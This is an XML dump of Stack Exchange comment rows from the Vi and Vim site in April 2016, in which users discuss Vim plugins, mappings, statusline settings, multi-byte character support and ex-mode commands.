  <row Id="11907" PostId="7249" Score="0" Text="It does seem rather amusing that getting this thing working appears to be more work than just installing the various components of whatever plugin you're after manually.  Why not take a few moments to see what plugin tools are recommended by the people who wrote the plugins you want to use?" CreationDate="2016-04-08T08:14:03.507" UserId="859" />
  <row Id="11909" PostId="7258" Score="1" Text="Can you post a screenshot of what you mean? Also, while editing a markdown file, do `:redir &gt; foo`, `:hi` (browse through all the highlight groups pressing space), `:redir end`, and add the contents of the newly created `foo` file here." CreationDate="2016-04-08T09:25:36.937" UserId="205" />
  <row Id="11910" PostId="7260" Score="0" Text="Thanks! This works for me under `Linux` , but not `AIX`. btw nothig with `:h magic` on my systems." CreationDate="2016-04-08T09:33:56.100" UserId="6946" />
  <row Id="11911" PostId="7260" Score="1" Text="under `AIX` it says `Invalid character in interval expression` ; but if I escape the second one, it works." CreationDate="2016-04-08T09:36:38.863" UserId="6946" />
  <row Id="11912" PostId="7256" Score="4" Text="I guess I found a possible solution with `g;` and `g,`.&#xA;These navigate `:changes` list." CreationDate="2016-04-08T10:04:37.273" UserId="6848" />
  <row Id="11914" PostId="7262" Score="3" Text="http://www.vim.org/scripts/script.php?script_id=30?" CreationDate="2016-04-08T10:40:17.140" UserId="205" />
  <row Id="11915" PostId="7255" Score="0" Text="I believe the OP has been using [vim-addon-manager from debian](https://anonscm.debian.org/gitweb/?p=pkg-vim/vim-addon-manager.git) which is different from Marc Webers [VAM (vim-addon-manager)](https://github.com/MarcWeber/vim-addon-manager)" CreationDate="2016-04-08T11:01:09.873" UserId="71" />
  <row Id="11916" PostId="7262" Score="2" Text="`[[` and `]]`, are provided by the default python ftplugin." CreationDate="2016-04-08T11:16:53.203" UserId="54" />
  <row Id="11917" PostId="7255" Score="0" Text="@ChristianBrabandt is correct. However, I never quite figured out how to actually *use* it. Not familiar with `curl`, not installed on my system.  Willing to do so, just wondering is there a reason that is preferable to `apt-get`?" CreationDate="2016-04-08T11:57:00.537" UserId="1705" />
  <row Id="11918" PostId="7255" Score="0" Text="Should clarify I am assuming that it is debian too given the repositories I have installed on my Ubuntu system." CreationDate="2016-04-08T12:04:48.780" UserId="1705" />
  <row Id="11919" PostId="7255" Score="0" Text="I understood that OP wanted to install this package but I was sure that this package was just an external plugin manager (since the [presentation](https://packages.debian.org/sid/vim-addon-manager) says `install or uninstall each of [the addons] in [the user] configuration directory (~/.vim)`). Also as OP said he wanted to install nibble I thought that he was simply not using the appropriate tool. My bad if I didn't understood the question correctly." CreationDate="2016-04-08T12:06:55.027" UserId="1841" />
  <row Id="11920" PostId="7264" Score="3" Text="You will love [Surround](https://github.com/tpope/vim-surround)." CreationDate="2016-04-08T12:34:06.273" UserId="54" />
  <row Id="11921" PostId="7264" Score="0" Text="@romainl shouldn't that be an answer?" CreationDate="2016-04-08T12:35:38.680" UserId="1405" />
  <row Id="11922" PostId="7264" Score="1" Text="@romainl That's hilarious – I *have* Surround, but I never knew it could change or delete existing delimiters! I guess I should read the documentation every now and then to see what I'm forgetting." CreationDate="2016-04-08T12:36:27.817" UserId="2036" />
  <row Id="11923" PostId="7264" Score="0" Text="(And if you put that as an answer with a brief summary of the commands I'll be happy to accept it.)" CreationDate="2016-04-08T12:39:35.977" UserId="2036" />
  <row Id="11924" PostId="7249" Score="0" Text="Debian's `vim-addon-manager` is for enabling/disabling addons that are installed through the package manager (apt, aptitude, etc.).  You want a different tool if you're trying to install a non-packaged addon." CreationDate="2016-04-08T12:52:22.817" UserId="15" />
  <row Id="11925" PostId="7262" Score="1" Text="@romainl Thanks for info, I know about `[[`, `]]`, `(`, `)`, `{` and `}`. `[[` and `]]` are useful in some cases but my main problem is I need `[]` and `][` or something like that, which provides jumps to end of next/previous method/class." CreationDate="2016-04-08T13:46:34.910" UserId="7153" />
  <row Id="11926" PostId="7262" Score="1" Text="@muru thanks, its `]e` solves most of my problems, however some mappings in this plugin seems to be broken like `]v` or `]&gt;` I'll try to fix them in a fork and publish it. Though I still wonder what was the plugin that provided `][` and `[]` it was really useful." CreationDate="2016-04-08T13:48:15.133" UserId="7153" />
  <row Id="11927" PostId="7267" Score="0" Text="That's pretty cool to have an explanation by of the author, thanks! I understand better the origin of the tool. The use case of the sysadmin that you mentioned seems pretty obvious, now I wonder why I didn't think about it in the first place. Thank you for your answer." CreationDate="2016-04-08T14:29:53.017" UserId="1841" />
  <row Id="11929" PostId="7275" Score="2" Text="With the default FS, modifying a field will nuke the extra spaces seen in the original record, when the record is re-computed for output. You might be better off doing; `awk -F': ' 'NR == 1{$NF++} NR == 2{$NF--}1'`." CreationDate="2016-04-09T07:48:52.983" UserId="205" />
  <row Id="11930" PostId="4233" Score="0" Text="Is the `''` at the end of the string deliberate or a typo? I imaging this can be done, since Vim highlights regexes in Vimscript files." CreationDate="2016-04-09T08:47:05.600" UserId="205" />
  <row Id="11931" PostId="7277" Score="0" Text="Thanks, that was it." CreationDate="2016-04-09T11:59:42.847" UserId="1248" />
  <row Id="11932" PostId="7282" Score="4" Text="Try the diffchar plugin. It might improve things." CreationDate="2016-04-09T17:14:43.400" UserId="205" />
  <row Id="11933" PostId="7284" Score="0" Text="Hmm, indeed. I'll wait a bit before accepting to allow others to post answers which could explain why the second `&lt;CR&gt;` is needed." CreationDate="2016-04-09T19:04:11.290" UserId="1081" />
  <row Id="11934" PostId="7284" Score="1" Text="One potential hint is that the problem does not occur if the value of `guifont` is empty." CreationDate="2016-04-09T19:13:46.800" UserId="2036" />
  <row Id="11936" PostId="7276" Score="0" Text="It turns out there is a related [ticket](https://github.com/tpope/vim-fugitive/issues/394) for `fugitive` plugin." CreationDate="2016-04-09T21:13:36.280" UserId="1248" />
  <row Id="11937" PostId="7226" Score="1" Text="+1. All three of these combinations also work in just about any other terminal application or shell, so you gain transferable skills through these as well. (I'm so used to Ctrl-W that I sometimes accidentally close other applications trying to backspace a word!)" CreationDate="2016-04-09T23:20:13.950" UserId="2036" />
  <row Id="11938" PostId="7112" Score="0" Text="There are lots of questions and answers of this kind. Have you done a simple search before asking a question? :)" CreationDate="2016-04-10T00:41:03.357" UserId="4754" />
  <row Id="11939" PostId="512" Score="0" Text="+1 for a completely built-in solution. The `_j` mapping added by the macro seems to justify the entire file for me, or it can be limited with a linewise visual selection." CreationDate="2016-04-10T05:06:18.567" UserId="7174" />
  <row Id="11940" PostId="7289" Score="0" Text="Thanks for your solution! I didn't install YCM or any other completion plugin. The popup menu sometimes does flicker in my experience. If I set the `pumheight` to `10` instead of `0`, it works better." CreationDate="2016-04-10T10:53:40.960" UserId="4754" />
  <row Id="11941" PostId="7283" Score="3" Text="I don't know why the prompt appears in this particular case, but when you want to be sure that a mapping doesn't bother you with a prompt, you can use `:silent!` in the `{rhs}` like you did, and add the argument `&lt;silent&gt;` just after `:nnoremap`. So, it would give something like: `nnoremap &lt;silent&gt; &lt;C-ScrollWheelUp&gt; :silent! let ...`. The difference between `:silent!` and `&lt;silent&gt;` is the following: `:silent!` makes sure the output of the command is not displayed, while `&lt;silent&gt;` makes sure the command itself is not displayed." CreationDate="2016-04-10T13:36:50.240" UserId="6960" />
  <row Id="11942" PostId="7295" Score="0" Text="Works great for those, but then it doesn't work for specifying text objects? I guess the symbols in text objects are technically commands and not literal characters, but there's obviously supposed to be a resemblance. I think at this point I'd rather not remap all the commands in normal mode as well (even though I was thinking about that earlier), but maybe that will end up being the best option." CreationDate="2016-04-10T15:20:15.847" UserId="2036" />
  <row Id="11943" PostId="7295" Score="0" Text="`omap` works for, say `d(`, but not for `da(`." CreationDate="2016-04-10T15:21:32.400" UserId="2036" />
  <row Id="11944" PostId="7295" Score="1" Text="@SorenBjornstad Maybe you could define 3 different objects: `(`, `i(` and `a(`. I don't know which key you want to use for `(`, but let's say it's `5`. Then, you could write: `onoremap 5 (`, `onoremap a5 a(` and `onoremap i5 i(`. If you don't want to repeat these 3 mappings for similar objects (`(`, `{`, `[`) you could write a `for` loop which would iterate over the items of a list containing the latter and define the 3 mappings for each. Note that to delete the text inside/around parentheses you can use `b` instead of `(`: `dib` or `dab`. Same thing with `B` for curly braces: `diB` or `daB`." CreationDate="2016-04-10T15:47:21.677" UserId="6960" />
  <row Id="11945" PostId="7296" Score="2" Text="This answer might help: http://vi.stackexchange.com/a/6400/6960 With this code, if you type `foofo&lt;space&gt;`, it will be expanded into `fooFOOBAR`. All you would have to do, is put your abbreviations inside the dictionary `s:anywhere_abbreviations`. For example, to add your abbreviation `iab bb bar`, you would add in the dictionary `'bb': 'bar'`." CreationDate="2016-04-10T16:01:29.427" UserId="6960" />
  <row Id="11946" PostId="7294" Score="0" Text="Yay ! Works fine with your last workaround ! Thanks a lot !" CreationDate="2016-04-10T16:39:12.047" UserId="7175" />
  <row Id="11948" PostId="7284" Score="0" Text="I think I know what happens: the first `&lt;CR&gt;` just finishes entering the command: without it you'll have the command typed in but not activated (you could then interactively edit it). The second one just does what the prompt requests." CreationDate="2016-04-10T18:24:49.917" UserId="1081" />
  <row Id="11949" PostId="7286" Score="0" Text="Thanks for the answer -- I imagine that Vim would have specific hooks for debugging, but I suppose that `gdb` would be a valid approach. I guess I was thinking that plugins would need something more specific. Has anyone else used `gdb` to debug Vim plugins?" CreationDate="2016-04-11T01:27:51.020" UserId="4748" />
  <row Id="11951" PostId="7298" Score="5" Text="`:g/^\%2l\|\%4l/pu _`" CreationDate="2016-04-11T11:51:44.683" UserId="71" />
  <row Id="11952" PostId="7285" Score="0" Text="Maybe that's not the ideal solution in your case but vim has a debug mode which can be useful sometimes. [`:h debug-mode`](http://vimdoc.sourceforge.net/htmldoc/repeat.html#debug-mode)." CreationDate="2016-04-11T11:57:44.993" UserId="1841" />
  <row Id="11953" PostId="2583" Score="0" Text="Aaaand it's still the same two keys as with ```''```." CreationDate="2016-04-11T12:17:28.517" UserId="6634" />
  <row Id="11954" PostId="7302" Score="1" Text="okay, how to combine it with search and replace? Another autocmd after the search and replace one?" CreationDate="2016-04-11T13:10:11.270" UserId="6634" />
  <row Id="11955" PostId="7300" Score="0" Text="Try this on the command line -  `set guifont=Lucida_Sans_Typewriter:h10:cANSI`. I was having the same problem until I changed the font. `¿` displays in this font" CreationDate="2016-04-11T13:19:13.410" UserId="1313" />
  <row Id="11956" PostId="7302" Score="0" Text="thanks!. You might want to fix typo the**n** :help cmd-lines" CreationDate="2016-04-11T13:36:47.930" UserId="6634" />
  <row Id="11957" PostId="7300" Score="0" Text="That has no effect (I wouldn't expect it to have an effect, since vim is being through through SSH without a gui. The font being used with PUTtY can display special characters, as I am able to see these in bash)" CreationDate="2016-04-11T14:29:45.407" UserId="3264" />
  <row Id="11960" PostId="7306" Score="0" Text="Seems I can't move it myself at my n00b rep (http://meta.stackexchange.com/questions/85017/moving-my-own-question-to-another-stack-exchange-site), but I'm totally up for it being moved (I didn't realize there was a Vi channel; cheers for that!)" CreationDate="2016-04-12T01:32:56.463" UserId="7203" />
  <row Id="11961" PostId="1952" Score="0" Text="I believe they have upvotes because they perfectly answer the *title* of the question, which is what brings visitors to this page. &quot;How to execute shell commands silently?&quot; A common SE phenomenon! Visitors are grateful, but perhaps not disciplined." CreationDate="2016-04-12T02:43:53.783" UserId="630" />
  <row Id="11962" PostId="1952" Score="0" Text="In an ideal world, we would probably have two separate questions: &quot;How to execute shell commands silently?&quot; and &quot;How to execute shell commands in the background?&quot; so that googlers can find what they are looking for." CreationDate="2016-04-12T02:45:30.290" UserId="630" />
  <row Id="11963" PostId="7285" Score="0" Text="Interesting -- and this should catch plugins?" CreationDate="2016-04-12T02:51:17.500" UserId="4748" />
  <row Id="11964" PostId="7302" Score="0" Text="Okay, this isn't actually working. Somehow when I save file the cursor goes to the start of the file (even when I'm pressing ```''``` manually). However when I'm pressing manually backtick twice the cursor moves to the correct position (where it was before saving file). But! Somehow if I would change double single quote to double backtick in ```call setpos('.', getpos(&quot;``&quot;))``` when I save file cursor still goes to the start of the file." CreationDate="2016-04-12T07:39:59.273" UserId="6634" />
  <row Id="11965" PostId="7285" Score="0" Text="I think it does catch plugins but I may be wrong (That's why I mentioned it in a comment and not in an answer)." CreationDate="2016-04-12T08:04:47.783" UserId="1841" />
  <row Id="11966" PostId="7310" Score="1" Text="Is there a way to save this (without having to use `let`) ?" CreationDate="2016-04-12T10:01:30.987" UserId="1821" />
  <row Id="11967" PostId="7310" Score="2" Text="No. `:let` it is. But you can save it into a variable (`:let foo = ...`) or into a register (`:let @a = ...`)." CreationDate="2016-04-12T10:03:56.553" UserId="54" />
  <row Id="11968" PostId="7307" Score="0" Text="Unfortunately this is not the problem. The character set in PuTTY is already set to utf-8. Since I'm able to paste utf-8 characters into bash, I suspect that the issue is a vim setting, not PuTTY, otherwise the former wouldn't work." CreationDate="2016-04-12T11:46:35.233" UserId="3264" />
  <row Id="11969" PostId="7307" Score="0" Text="Very strange; a few things that might narrow down the problem a bit: try &quot;echo ¿ &gt;&gt; temp.txt&quot; from bash then vim temp.txt and see if your character shows up; that will tell us if it can't display it at all or if it's just an input thing. Are you using something like screen or tmux? That might impact vim's interaction with the terminal. Are you using a binary build of vim? I'm wondering how it was built; maybe a compile flag is off. If you installed it from your distro package manager such as apt or it came with your distro, let us know what distro," CreationDate="2016-04-12T13:35:26.150" UserId="7203" />
  <row Id="11970" PostId="7300" Score="2" Text="Does this happen even if you start with `vim -Nu NONE`? What is the output of `vim --version`?" CreationDate="2016-04-12T13:41:15.927" UserId="205" />
  <row Id="11971" PostId="7307" Score="0" Text="That echo test *does* work for an inverted question mark, but not for others. For example, `‘ ¿ ’` becomes `▒~@~X¿▒~@~Y`. Even so, I still can't insert a ¿ using Ctrl+K, ?, I" CreationDate="2016-04-12T14:19:21.050" UserId="3264" />
  <row Id="11972" PostId="7307" Score="0" Text="OS is SunOS 5.10. I added the output of `vim --version` to the question." CreationDate="2016-04-12T14:20:37.460" UserId="3264" />
  <row Id="11973" PostId="7300" Score="1" Text="That's a bit of an ancient version of vim - I also noticed -multi-byte in that compile flag list; mine's +multi-byte, so my best guess is that your problem is there. You said below you're on Sun OS, which I'm not all that familiar with; perhaps it has a package manager you can go through to update/alter vim, or perhaps you can recompile it yourself on that machine." CreationDate="2016-04-12T14:23:40.883" UserId="7203" />
  <row Id="11974" PostId="7300" Score="0" Text="I've added the output from `vim --version` to the question. Yes, the issue does persist with `vim -Nu NONE`" CreationDate="2016-04-12T14:23:50.227" UserId="3264" />
  <row Id="11975" PostId="7300" Score="0" Text="@ZeroG, I don't have admin rights on the machine, so I can't upgrading it or re-compiling. Thanks for the tip on the +multi-byte flag. If that's it, I suppose I'm SOL." CreationDate="2016-04-12T14:25:41.250" UserId="3264" />
  <row Id="11976" PostId="7307" Score="0" Text="Since the issue seems to be the lack of multi-byte support, if you want to add that to this answer, I'll mark it as accepted." CreationDate="2016-04-12T14:31:15.017" UserId="3264" />
  <row Id="11977" PostId="7300" Score="0" Text="Well... how determined are you ;). A few years ago, I had a coworker on an AIX system who really wanted to use emacs, but vi was the only editor on the system. He similarly didn't have root permissions, but downloaded the source code and compiled it himself. I did something similar on a Solaris system a while back. You might be able to do that yourself if you've at least got make and gcc, but be warned you'd need to get any dependencies yourself, and there's other assorted tribulations you may encounter there. But there's hope if you really need it." CreationDate="2016-04-12T14:38:53.110" UserId="7203" />
  <row Id="11978" PostId="7311" Score="3" Text="it is always better to provide some few real original lines of text and example of the resulting lines expected. Could you edit the question and add this information?" CreationDate="2016-04-12T14:48:52.253" UserId="6945" />
  <row Id="11979" PostId="7312" Score="0" Text="I'm accepting this answer because it leads directly to what I was asking. I left out the `\2` because I'd like the entire selection to be removed. However, thanks for the tip for future reference!" CreationDate="2016-04-12T15:07:01.543" UserId="7210" />
  <row Id="11980" PostId="7241" Score="1" Text="It might be worthwile to add completion to the comand, like&#xA;`command! -nargs=+ -completion=command K :call KeepEx(&quot;&lt;args&gt;&quot;)`" CreationDate="2016-04-12T15:19:51.137" UserId="3343" />
  <row Id="11981" PostId="7314" Score="1" Text="have a look at: https://github.com/tpope/vim-sleuth" CreationDate="2016-04-12T15:31:00.643" UserId="1821" />
  <row Id="11982" PostId="7320" Score="0" Text="I like the use of this and can set mappings to this. The editorconfig works well but would probably prefer to stay with this option than having to rely on another plugin." CreationDate="2016-04-12T17:36:08.677" UserId="4870" />
  <row Id="11983" PostId="7318" Score="1" Text="`&quot; I use, for example :!make. This is easy to do&quot;` -- you may find the [built-in `:make`](http://vimhelp.appspot.com/usr_30.txt.html) command useful." CreationDate="2016-04-12T17:39:38.140" UserId="1405" />
  <row Id="11984" PostId="7302" Score="1" Text="IMHO It works just fine." CreationDate="2016-04-12T18:20:13.330" UserId="6698" />
  <row Id="11985" PostId="7322" Score="0" Text="Exactly what I was looking for! ;)" CreationDate="2016-04-12T18:24:10.207" UserId="6498" />
  <row Id="11986" PostId="7323" Score="2" Text="Similar post: [Quickest navigation within a buffer](http://vi.stackexchange.com/q/2230/778)" CreationDate="2016-04-12T19:49:32.937" UserId="778" />
  <row Id="11987" PostId="7323" Score="0" Text="Indeed, thanks!" CreationDate="2016-04-12T19:55:18.503" UserId="7215" />
  <row Id="11988" PostId="7321" Score="0" Text="FWIW, [this link](http://unix.stackexchange.com/q/151118) provides more information about `compgen`." CreationDate="2016-04-12T20:14:10.887" UserId="6698" />
  <row Id="11991" PostId="7315" Score="1" Text="*Almost* there. That gives me the full path of the file in the buffer (`/Users/name/directory/`), not the compact output I get from `%f` (`~/directory/`). Also, the background color is different from the rest of the status line, no idea why: http://imgur.com/UaIrNND" CreationDate="2016-04-13T08:33:08.110" UserId="3079" />
  <row Id="11994" PostId="7315" Score="0" Text="Thank you! I'll look into it asap." CreationDate="2016-04-13T09:18:11.260" UserId="3079" />
  <row Id="11995" PostId="7325" Score="0" Text="Thanks for the answer, but you completely disregarded the Ex mode requirement in the question" CreationDate="2016-04-13T12:13:30.593" UserId="7184" />
  <row Id="11996" PostId="7325" Score="2" Text="@StevenPenny You're totally right the answer isn't applicable with the ex mode that's what I meant by the second sentence of my answer (after the **Note**). I think that could be useful to other users ending on a question titled &quot;invert range selection&quot;." CreationDate="2016-04-13T12:18:22.987" UserId="1841" />
  <row Id="11997" PostId="6238" Score="0" Text="To anyone following this: [vim8](https://github.com/vim/vim/blob/master/runtime/doc/version8.txt) promises async commands, which may help." CreationDate="2016-04-13T15:21:54.210" UserId="142" />
  <row Id="11998" PostId="7315" Score="0" Text="No need of `substitute()`, to get the full path use `:p`, so in your case: `expand('%:p:h')` will do it." CreationDate="2016-04-13T15:39:19.470" UserId="4903" />
  <row Id="12000" PostId="7325" Score="0" Text="Maybe you could use `silent!` to take into account edge cases such as `1,2` and `7,$`, but if you do so the range will always be swapped (see [`:h 493`](http://vimhelp.appspot.com/cmdline.txt.html#E493)) and this could delete the fist line with a range such as `1,2`." CreationDate="2016-04-13T19:55:25.173" UserId="6698" />
  <row Id="12001" PostId="7323" Score="1" Text="Perhaps of interest: my question [how to move vertically until reaching a non-whitespace character](http://vi.stackexchange.com/questions/120/how-to-move-vertically-until-reaching-a-non-whitespace-character)" CreationDate="2016-04-13T20:20:27.840" UserId="67" />
  <row Id="12002" PostId="7329" Score="0" Text="This seems like the way to go indeed" CreationDate="2016-04-13T20:23:38.013" UserId="7215" />
  <row Id="12003" PostId="7329" Score="3" Text="@ambushed you might also want to `:set incsearch`" CreationDate="2016-04-13T21:26:17.900" UserId="514" />
  <row Id="12004" PostId="7263" Score="0" Text="Oh yeah, just set it to zero in config and that seems to fix it. Interesting that it is 0 by default, I guess some plugins change the settings." CreationDate="2016-04-14T02:22:01.323" UserId="237" />
  <row Id="12006" PostId="6797" Score="0" Text="@muru no, you can just pick which one you get in a given session more easily ;)" CreationDate="2016-04-14T05:32:37.147" UserId="2658" />
  <row Id="12007" PostId="6797" Score="0" Text="@hobbs I'm pretty sure the packages conflict with the python3 ones." CreationDate="2016-04-14T06:00:29.107" UserId="205" />
  <row Id="12008" PostId="6797" Score="0" Text="@muru they don't, in fact. You can have both installed and run whichever one you choose, as well as pick one to be your default vim. It's not great, but it's an improvement." CreationDate="2016-04-14T06:18:25.993" UserId="2658" />
  <row Id="12009" PostId="7323" Score="0" Text="http://www.thegeekstuff.com/2009/03/8-essential-vim-editor-navigation-fundamentals/" CreationDate="2016-04-14T06:28:06.130" UserId="7079" />
  <row Id="12010" PostId="6797" Score="0" Text="@hobbs that's nice to know. Can you edit that into this post? I've thinking of converting this to a comment since the day it was posted, it really could use a few more details." CreationDate="2016-04-14T06:34:15.413" UserId="205" />
  <row Id="12011" PostId="7325" Score="0" Text="@JairLopez: My code was just a hint and wasn't extensively tested so you're right using `silent` could be an improvement but the fact that the range is swapped with no warning could be a drawback in some cases. I think one should adapt it to fit his needs :-)" CreationDate="2016-04-14T08:41:20.380" UserId="1841" />
  <row Id="12012" PostId="7315" Score="0" Text="Still not getting the compact output I get with `%f`: with `expand('%:~:.:h')` I only get the path from the current directory, with `expand('%:p:h')` I get the full path from root. And the problem with the background color persists even if using `%#StatusLine#` :(" CreationDate="2016-04-14T10:23:23.680" UserId="3079" />
  <row Id="12013" PostId="7332" Score="0" Text="Sorry that is my bad, I use &lt;BS&gt;. Editing question now" CreationDate="2016-04-14T12:06:59.037" UserId="7125" />
  <row Id="12014" PostId="7332" Score="0" Text="OK, but I got it working here, strange..." CreationDate="2016-04-14T12:08:18.027" UserId="1821" />
  <row Id="12015" PostId="7332" Score="0" Text="Yep, I know. Suppose to be really simple. Not sure why this is not working for me." CreationDate="2016-04-14T12:08:47.343" UserId="7125" />
  <row Id="12016" PostId="7332" Score="0" Text="have you tried without any config in you vimrc file ?" CreationDate="2016-04-14T12:09:30.407" UserId="1821" />
  <row Id="12017" PostId="7332" Score="0" Text="can you try with and without the `compatible` option set? It doesn't work without also." CreationDate="2016-04-14T12:13:01.130" UserId="1821" />
  <row Id="12018" PostId="7332" Score="0" Text="I have it on. &#xA;I have added my .vimrc .. if it will help" CreationDate="2016-04-14T12:19:59.157" UserId="7125" />
  <row Id="12019" PostId="7331" Score="1" Text="I used your vimrc but removed the `pathogen#infect()` and the mapping works correctly. So I suspect one of your plugin to cause the problem. Can you try to comment the execution of pathogen and see if the problem still occurs?" CreationDate="2016-04-14T12:23:27.450" UserId="1841" />
  <row Id="12020" PostId="7331" Score="0" Text="Yes. You are right. That is one of the plugins." CreationDate="2016-04-14T12:29:14.617" UserId="7125" />
  <row Id="12021" PostId="7331" Score="1" Text="Before posting on this site I strongly recommend that you read (and apply) [How do I debug my vimrc](http://vi.stackexchange.com/a/2004/1841) it will help you spot a vast majority of your problems." CreationDate="2016-04-14T12:35:24.070" UserId="1841" />
  <row Id="12022" PostId="7331" Score="0" Text="@statox Yes, I was not aware of this. I will do it now." CreationDate="2016-04-14T12:48:08.733" UserId="7125" />
  <row Id="12023" PostId="7331" Score="1" Text="Great! In the other hand don't hesitate to ask your questions when you already have done some debugging, the community of this site is generally pretty good to give fast and good answers :-)" CreationDate="2016-04-14T12:57:32.153" UserId="1841" />
  <row Id="12025" PostId="7337" Score="0" Text="Solved, the 'simpler version' worked perfectly. The first version however, resulted in the duplicate line still beginning with `foo`...." CreationDate="2016-04-14T13:23:16.293" UserId="4446" />
  <row Id="12026" PostId="7337" Score="0" Text="strange, did you entered `^M` as I explained ?" CreationDate="2016-04-14T13:24:07.960" UserId="1821" />
  <row Id="12027" PostId="7337" Score="0" Text="My bad, didn't read that well. First solution works as well!" CreationDate="2016-04-14T13:25:52.260" UserId="4446" />
  <row Id="12029" PostId="7336" Score="0" Text="If you aren't hell-bound on a regexp, a macro will do just fine. Doesn't really matter much in simple cases like this, but if you have something a bit more complicated it's a very valid alternative." CreationDate="2016-04-14T13:31:26.950" UserId="1296" />
  <row Id="12030" PostId="7333" Score="1" Text="Enable *relative* line numbers and move using `count` `j`/`k`." CreationDate="2016-04-14T13:53:21.327" UserId="1800" />
  <row Id="12031" PostId="7333" Score="1" Text="Similar posts: [Hardcore vim mode: what is the best way to move vertically?](http://vi.stackexchange.com/q/7323/778) or [Quickest navigation within a buffer](http://vi.stackexchange.com/q/2230/778)" CreationDate="2016-04-14T14:18:20.043" UserId="778" />
  <row Id="12032" PostId="7315" Score="0" Text="@zool Have you tried to remove the `:.` modifier to get this `%{expand('%:~:h')}`? For the background color, you could type `:hi` to see all the highlight groups installed, look for the one whose colors you're interested in, then note its name to replace `%#StatusLine#`. If this doesn't work, could you post the output of `:verb hi StatusLine` and `:verb hi Keyword`?" CreationDate="2016-04-14T16:16:11.903" UserId="6960" />
  <row Id="12033" PostId="7338" Score="5" Text="`:help fnamemodify`" CreationDate="2016-04-14T17:06:58.010" UserId="54" />
  <row Id="12034" PostId="7333" Score="1" Text="This recent question may be helpful: http://vi.stackexchange.com/questions/7323/hardcore-vim-mode-what-is-the-best-way-to-move-vertically" CreationDate="2016-04-14T12:31:12.120" UserId="7128" />
  <row Id="12035" PostId="7337" Score="0" Text="I don't know why you bother including the complicated version at all.  The simpler version is...simpler.  ;)  (Not to mention being POSIX compliant.)  Why not put it first?" CreationDate="2016-04-15T00:05:25.993" UserId="4676" />
  <row Id="12036" PostId="7337" Score="1" Text="Initially I came up with the first version, which was more natural to me, because at the time I was not aware of `t`, and then I added the second one. I'll change the order, you are right. How about the first one being POSIX ?" CreationDate="2016-04-15T05:54:49.877" UserId="1821" />
  <row Id="12037" PostId="7343" Score="0" Text="It does not on my machine using zsh, can you add your configuration?" CreationDate="2016-04-15T06:05:17.263" UserId="1821" />
  <row Id="12038" PostId="7343" Score="1" Text="First remove the `-s` of your second command, if you are trying to debug something the silent mode isn't helping. Then `man ex` says that you need to put double quote around your command if it contains spaces so you should also change that. Once it is done you can give us what vim says and it will probably be easier to help you :-)" CreationDate="2016-04-15T07:46:23.780" UserId="1841" />
  <row Id="12039" PostId="4554" Score="0" Text="use double quotes" CreationDate="2016-04-15T08:08:30.980" UserId="71" />
  <row Id="12040" PostId="7343" Score="1" Text="I second Nobe4. The command works fine, if `ex` is actually Vim. If it is actually `ex` (say, from [ex-vi](http://ex-vi.sourceforge.net)), I get an error about `argdo` and `ex` waits around for me to enter commands." CreationDate="2016-04-15T08:29:10.027" UserId="205" />
  <row Id="12041" PostId="7315" Score="0" Text="@user9433424 worked beautifully with `%{expand('%:~:h')}` and by hunting for the right highlight group through `:hi` (the wrong background color with `StatusLine` was indeed a color scheme issue). If you edit your answer accordingly I will accept it. Thank you very much for your help!" CreationDate="2016-04-15T08:30:39.597" UserId="3079" />
  <row Id="12042" PostId="7328" Score="1" Text="You have any online source for Russian synonym, like a website or something? I can easily write a backend with its API for my existing query plugin.   https://github.com/Ron89/thesaurus_query.vim" CreationDate="2016-04-15T09:30:46.223" UserId="6625" />
  <row Id="12046" PostId="7346" Score="0" Text="I remember also watching a screen cast where the user would resize the inactive windows to 5 lines, to keep the context." CreationDate="2016-04-15T11:43:24.507" UserId="1821" />
  <row Id="12047" PostId="7335" Score="1" Text="Point 3 is very similar to Bram's document, http://www.moolenaar.net/habits.html (see part 1 about file navigation). There is the mechanics of file navigation and then there is the mindset of asking our self, &quot;what am I navigating to&quot;.  You do provide a very comprehensive list of approaches." CreationDate="2016-04-15T14:27:59.273" UserId="2679" />
  <row Id="12048" PostId="7333" Score="1" Text="You might consider looking at `:help z`" CreationDate="2016-04-15T14:30:57.117" UserId="2679" />
  <row Id="12050" PostId="7344" Score="1" Text="Yes, I removed the brackets from the statusline later, because I want nothing to show up when I'm outside of the source directory.  Your version also has the bonus of fixing a weird bug when I `:e /home/karl/source`.  Thanks very much." CreationDate="2016-04-15T14:53:23.140" UserId="780" />
  <row Id="12051" PostId="7353" Score="0" Text="I didn't even know there was a stackexchange for vi, sorry. How can I ask for migration?" CreationDate="2016-04-15T12:28:38.993" UserDisplayName="Matthieu.P" />
  <row Id="12052" PostId="7353" Score="0" Text="Let me tag this question, it should be enough for an admin to see it." CreationDate="2016-04-15T12:29:41.807" UserId="1821" />
  <row Id="12053" PostId="7353" Score="1" Text="I use the flag button, don't know if it's the right way but it should work :)" CreationDate="2016-04-15T12:31:09.510" UserDisplayName="Matthieu.P" />
  <row Id="12054" PostId="7354" Score="1" Text="Exactly what I want! (And even better with the &quot;only *.robot&quot; option!) Thanks a lot!" CreationDate="2016-04-15T13:24:36.003" UserDisplayName="Matthieu.P" />
  <row Id="12055" PostId="5795" Score="0" Text="Using ! before a command makes it a shell command, isn't? I think you can directly give the command without ! sign." CreationDate="2016-04-15T15:57:58.543" UserId="7161" />
  <row Id="12056" PostId="4144" Score="0" Text="Did you checked whether your version of vim supports Unicode. Give vim --version and a check whether it has +multi byte in it. Also, set encoding to utf8 in vim. :set encoding=utf8" CreationDate="2016-04-15T16:09:55.677" UserId="7161" />
  <row Id="12057" PostId="7193" Score="0" Text="One of my previous questions [&quot;How to set up Vim to work with one sentence per line?&quot;](https://vi.stackexchange.com/questions/2846/how-to-set-up-vim-to-work-with-one-sentence-per-line) shares some overlap with the &quot;line based version control and LaTeX&quot; part of your question. There might be some answers for you there!" CreationDate="2016-04-15T16:42:35.847" UserId="1402" />
  <row Id="12058" PostId="7355" Score="1" Text="Please see my PS -- I have about a hundred of foo's and it's a pain to look through all the pages of `ts` to find my match" CreationDate="2016-04-15T17:03:25.427" UserId="7248" />
  <row Id="12059" PostId="7328" Score="0" Text="@Chong, thanks! I've done superficial research and havn't find one, but I'll try again!" CreationDate="2016-04-15T17:29:54.543" UserId="5182" />
  <row Id="12060" PostId="7343" Score="1" Text="Hmm, that looks like Vim. What does `ex --version` say?" CreationDate="2016-04-15T18:43:33.803" UserId="205" />
  <row Id="12061" PostId="7328" Score="1" Text="Found one. http://www.jiport.com/ But connection from my location is not ideal. I don't understand Russian, so I can't really tell. You think this one good enough?" CreationDate="2016-04-15T19:41:49.567" UserId="6625" />
